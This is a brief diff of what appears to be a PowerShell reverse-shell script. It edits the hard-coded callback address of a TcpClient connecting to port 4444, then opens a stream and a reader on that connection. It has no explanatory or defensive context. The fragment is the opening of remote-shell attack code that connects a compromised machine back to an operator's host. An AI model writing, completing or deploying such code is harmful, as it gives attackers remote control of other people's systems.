@@ -1,4 +1,4 @@
-$client = New-Object System.Net.Sockets.TcpClient("10.57.183.12",4444)
+$client = New-Object System.Net.Sockets.TcpClient("10.57.66.105",4444)
 $stream = $client.GetStream()
 
 $reader = New-Object System.IO.StreamReader($stream)
